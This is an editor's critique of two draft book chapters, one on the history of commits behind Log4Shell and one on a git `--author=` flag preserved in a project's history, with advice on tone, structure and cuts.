# Register: is 03 a palate-cleanser, or a skit?

It is a palate-cleanser. Protect that.

Same narrator: in the repo, opinionated, no sneering, first person almost too absent (same note as 02; one “I grep for the name everyone is looking for” in the open would match chapter 01 without turning this into a bit). Lower stakes: a quoting boundary, not a CVE. Tender toward Gavin: “the opposite of careless,” “the honest, generous thing.” Wonder at permanence: load-bearing, sixteen years, the row still there. That is the register. It is not comedy. “Smallest story in the book” is what would make it a skit, because it asks for applause for the programming of the sequence.

The hidden reason this chapter belongs *here*, and not merely as relief: chapter 02’s seam is a string that stopped being data and became an instruction (`${`). Chapter 03’s seam is an instruction that was recorded as data (`--author=`). Same family of git-shaped accident, inverted, nobody on fire. Do not name the rhyme. Clean the data/instruction sentence in 03 so a reader coming off 02 can hear it. If you italicize, lecture, or add “as we just saw with Log4j,” you will have written a textbook transition and killed the cleanser.

---

# Top 5 changes, across both chapters, by impact

1. **Chapter 02: do not argue with the careless-person story in paragraph one.** Cut Log4Shell, the count, the reef, and “nobody was careless” from the open. Enter on the 2010 convenience (or the 2012 subject). Walk five Tuesdays. Let the reader refuse the villain themselves. This is the change that turns the thesis chapter from a recap of a thesis into the book.

2. **Chapter 02: stop announcing turns; reweight so 2013 is not the climax.** Cut “here is the pivot,” “the whole disaster in one sentence,” “the one detail that is not in the postmortems,” “while everyone looks straight at it.” Isolate the beats you already have: the performance-guard line; “An off switch whose default is on is not a mitigation. It is a comment.”; “They named it `JndiExploit`.”; “You cannot delete a verb from a language that auto-discovers its verbs.” Recast 2016–2021 as *they looked, and saw Camel and CPU* — that is compounding, not appendix. If 2013 remains the bomb-is-built peak, the thesis sections cannot land no matter how much you expand them.

3. **Chapter 02: inhabit 2012 and 2016, and retitle off the villain-shaped verb.** Spend the added words on Ralph’s hot-path instinct and on the Camel ticket as a careful project pointing the wrong way — not on December, not on LDAP. Change the title to **To improve performance** (or make “late” mean the list was already open). Year-headings become story objects. First person at the clone and at the 2021 timestamps. Fuse the 2014 TODO / FQCN leftover into At home; cut the thesis recap that currently opens that section.

4. **Chapter 03: keep it short; cut the self-grading; sit with the honest move.** Do not chase 2,200. Delete “smallest story in the book and one of the truest” and the “most scrutinized” superlative. Expand only Gavin’s week of preserving a name, and isolate “The mistake is load-bearing now.” Let the shortlog finish its sentence before you name the flag. This is how the palate-cleanser stays the same book instead of an intermission card.

5. **Both At homes: leftover, then one habit, then the line you already wrote.** 02: you cannot delete a verb → grep the seam → “The dangerous commit almost never says danger.” 03: the row is cheaper than touching the ledger → a name is the work → “Sometimes it is a person. Sometimes it is a flag.” Two lessons at equal volume, or a moral that restates the open, is how chapter 01’s first At home failed. You already know this. Both drafts still do it.

---

# The single most important change for each

**Chapter 02.** Stop announcing that there is no villain, and spend the five deposits as rooms so the reader can feel they would have approved every one.

The whole book is riding this chapter. Right now the folklore (someone was careless) is in the doorway as an argument you win in sentence two, and the book — Ralph saving CPU, a colon in a docstring, Camel, a GitHub grep, a test class named `JndiExploit` — is in the other room. If the open is a convenience, and 2016 is the moment they looked, and the leftover is a verb you cannot delete, the thesis will be something the reader says to themselves a beat before you do. That is the assignment. The five commits are already the right five.

**Chapter 03.** Do not pad it, and do not apologize for it. Cut “this is the smallest story in the book.” Sit with Gavin trying to keep someone else’s name on the work, then isolate why the flag is still there.

The register is already right: same narrator, lower stakes, no sneer. The shortlog is already the right open. The last line is already the right last line. What is missing is not length toward 2,200 and not a louder joke. It is one inhabited Tuesday, and the courtesy of not telling us how to feel about a third row we can already see.
